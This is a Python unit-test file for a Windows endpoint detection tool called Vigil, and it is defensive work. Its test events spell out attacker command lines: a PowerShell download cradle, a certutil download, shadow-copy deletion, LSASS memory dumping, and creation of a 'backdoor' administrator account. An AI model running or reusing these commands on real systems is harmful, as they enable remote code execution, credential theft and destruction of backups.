"""Unit tests for the detection logic. They run on any OS:

    python -m unittest discover tests -v

Each test feeds a hand-written event to the rule engine and checks which rules
fire. When you write a new rule, add a test with one event that should match
and one that should not: that is how detection engineers stop false positives
from creeping in.
"""
import tempfile
import unittest
from pathlib import Path

from vigil.config import RULES_FILE
from vigil.db import Database
from vigil.detection.behaviours import Behaviours
from vigil.detection.engine import RuleEngine, matches
from vigil.pipeline import Pipeline


def proc(name, cmd="", parent="explorer.exe", exe=None):
    return {"category": "process", "action": "start", "process.name": name, "process.command_line": cmd,
            "process.parent.name": parent, "process.executable": exe or f"C:\\Windows\\System32\\{name}", "process.pid": 1000}


class RuleTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.engine = RuleEngine(RULES_FILE)

    def fired(self, event):
        return {r["id"] for r, _ in self.engine.evaluate(event)}

    def test_rules_load_and_have_mitre(self):
        self.assertGreaterEqual(len(self.engine.rules), 30)
        for r in self.engine.rules:
            self.assertIn(r["severity"], ("low", "medium", "high", "critical"), r["id"])
            self.assertTrue(r["mitre"]["technique"].startswith("T"), r["id"])

    def test_office_spawns_powershell(self):
        self.assertIn("VIG-001", self.fired(proc("powershell.exe", "powershell", parent="WINWORD.EXE")))
        self.assertNotIn("VIG-001", self.fired(proc("powershell.exe", "powershell", parent="explorer.exe")))

    def test_encoded_powershell(self):
        self.assertIn("VIG-002", self.fired(proc("powershell.exe", "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi")))
        self.assertNotIn("VIG-002", self.fired(proc("powershell.exe", "powershell.exe -File C:\\scripts\\enc.ps1")))

    def test_download_cradle(self):
        cmd = "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"
        self.assertIn("VIG-003", self.fired(proc("powershell.exe", cmd)))

    def test_certutil(self):
        self.assertIn("VIG-010", self.fired(proc("certutil.exe", "certutil -urlcache -split -f http://x/a.exe a.exe")))
        self.assertNotIn("VIG-010", self.fired(proc("certutil.exe", "certutil -store my")))

    def test_shadow_copy_delete(self):
        self.assertIn("VIG-020", self.fired(proc("vssadmin.exe", "vssadmin.exe Delete Shadows /All /Quiet")))
        self.assertIn("VIG-020", self.fired(proc("wmic.exe", "wmic shadowcopy delete")))
        self.assertNotIn("VIG-020", self.fired(proc("vssadmin.exe", "vssadmin list shadows")))

    def test_lsass_dump(self):
        self.assertIn("VIG-030", self.fired(proc("rundll32.exe", r"rundll32 C:\windows\system32\comsvcs.dll, MiniDump 624 c:\temp\l.dmp full")))
        self.assertIn("VIG-030", self.fired(proc("procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe out.dmp", exe=r"C:\tools\procdump64.exe")))

    def test_masquerading_svchost(self):
        self.assertIn("VIG-016", self.fired(proc("svchost.exe", exe=r"C:\Users\bob\AppData\Roaming\svchost.exe")))
        self.assertNotIn("VIG-016", self.fired(proc("svchost.exe", exe=r"C:\Windows\System32\svchost.exe")))

    def test_user_writable_path(self):
        self.assertIn("VIG-015", self.fired(proc("setup.exe", exe=r"C:\Users\bob\Downloads\setup.exe")))

    def test_account_creation(self):
        self.assertIn("VIG-041", self.fired(proc("net.exe", "net user backdoor P@ssw0rd! /add")))
        self.assertIn("VIG-041", self.fired(proc("net.exe", "net localgroup administrators backdoor /add")))
        self.assertNotIn("VIG-041", self.fired(proc("net.exe", "net user")))

    def test_double_extension(self):
        e = {"category": "file", "action": "create", "file.name": "invoice.pdf.exe", "file.path": r"C:\Users\bob\Downloads\invoice.pdf.exe"}
        self.assertIn("VIG-050", self.fired(e))
        e2 = {**e, "file.name": "report.pdf", "file.path": r"C:\Users\bob\Downloads\report.pdf"}
        self.assertNotIn("VIG-050", self.fired(e2))

    def test_startup_folder_file(self):
        e = {"category": "file", "action": "create", "file.name": "a.lnk",
             "file.path": r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.lnk"}
        self.assertIn("VIG-043", self.fired(e))

    def test_network_rules(self):
        e = {"category": "network", "action": "connect", "process.name": "rundll32.exe", "destination.ip": "203.0.113.5",
             "destination.port": 4444, "destination.public": True}
        self.assertTrue({"VIG-060", "VIG-061"} <= self.fired(e))
        self.assertFalse(self.fired({**e, "destination.public": False, "destination.ip": "10.0.0.5"}) & {"VIG-060", "VIG-061"})

    def test_intel_fields(self):
        self.assertIn("VIG-070", self.fired({"category": "file", "action": "create", "intel.hash_match": True}))
        self.assertIn("VIG-072", self.fired({"category": "file", "action": "create", "intel.vt_malicious": 12}))

    def test_disable_toggle(self):
        e = proc("vssadmin.exe", "vssadmin delete shadows /all")
        self.engine.toggle("VIG-020")
        self.assertNotIn("VIG-020", self.fired(e))
        self.engine.toggle("VIG-020")
        self.assertIn("VIG-020", self.fired(e))

    def test_match_tree(self):
        node = {"all": [{"field": "a", "op": "equals", "value": "X"}, {"none": [{"field": "b", "op": "contains", "value": "safe"}]}]}
        self.assertTrue(matches(node, {"a": "x", "b": "bad"}))
        self.assertFalse(matches(node, {"a": "x", "b": "very safe"}))


class BehaviourTests(unittest.TestCase):
    def test_brute_force(self):
        b = Behaviours()
        hits = []
        for i in range(10):
            hits = b.evaluate({"category": "auth", "action": "logon_failed", "source.ip": "198.51.100.1", "user.name": f"u{i}"})
        self.assertEqual(hits[0][0]["id"], "VIG-B01")

    def test_discovery_burst(self):
        b = Behaviours()
        hits = []
        for name in ("whoami.exe", "ipconfig.exe", "net.exe", "systeminfo.exe"):
            hits = b.evaluate({"category": "process", "action": "start", "process.name": name, "user.name": "bob"})
        self.assertEqual(hits[0][0]["id"], "VIG-B02")

    def test_no_burst_from_few_tools(self):
        b = Behaviours()
        for name in ("whoami.exe", "whoami.exe", "whoami.exe"):
            self.assertEqual(b.evaluate({"category": "process", "action": "start", "process.name": name, "user.name": "bob"}), [])


class PipelineTests(unittest.TestCase):
    def test_event_to_alert_with_dedup(self):
        class NoIntel:
            def enrich(self, e): return e
        tmp = tempfile.TemporaryDirectory()
        db = Database(Path(tmp.name) / "t.db")
        p = Pipeline(db, RuleEngine(RULES_FILE), Behaviours(), NoIntel())
        e = proc("vssadmin.exe", "vssadmin delete shadows /all /quiet", parent="cmd.exe")
        p.process(dict(e))
        p.process(dict(e))  # same thing again: should be de-duplicated
        alerts = db.alerts()
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["rule_id"], "VIG-020")
        self.assertEqual(alerts[0]["technique"], "T1490")
        self.assertEqual(p.stats["alerts_suppressed"], 1)
        self.assertEqual(len(db.events()), 2)
        db._conn.close()
        tmp.cleanup()


class ResponseGuardTests(unittest.TestCase):
    """Response actions must refuse anything that would crash the machine or kill Vigil itself."""

    def setUp(self):
        import os
        from vigil.response import Responder
        self.tmp = tempfile.TemporaryDirectory()
        self.db = Database(Path(self.tmp.name) / "t.db")
        self.r = Responder(self.db)
        self.own = os.getpid()

    def tearDown(self):
        self.db._conn.close()
        self.tmp.cleanup()

    def test_refuses_system_and_own_processes(self):
        import os
        for pid in (0, 1, 4, self.own, os.getppid()):
            res = self.r.run_action("kill", pid)
            self.assertFalse(res["ok"], f"kill {pid} should be refused")
        self.assertTrue(all(not a["ok"] for a in self.db.actions()))

    def test_rejects_bad_input(self):
        self.assertFalse(self.r.run_action("kill", "abc")["ok"])
        self.assertFalse(self.r.run_action("block_ip", "not-an-ip")["ok"])
        self.assertFalse(self.r.run_action("block_ip", "127.0.0.1")["ok"])
        self.assertFalse(self.r.run_action("format_disk", "C:")["ok"])

    def test_quarantine_and_restore(self):
        f = Path(self.tmp.name) / "sample.exe"
        f.write_text("harmless")
        self.assertTrue(self.r.run_action("quarantine", str(f))["ok"])
        self.assertFalse(f.exists())
        qid = self.r.quarantined()[0]["id"]
        self.assertTrue(self.r.run_action("restore", qid)["ok"])
        self.assertEqual(f.read_text(), "harmless")

    def test_kill_child_process(self):
        import subprocess, sys
        child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
        res = self.r.run_action("kill", child.pid)
        self.assertTrue(res["ok"], res)
        self.assertIsNotNone(child.wait(timeout=5))


if __name__ == "__main__":
    unittest.main()
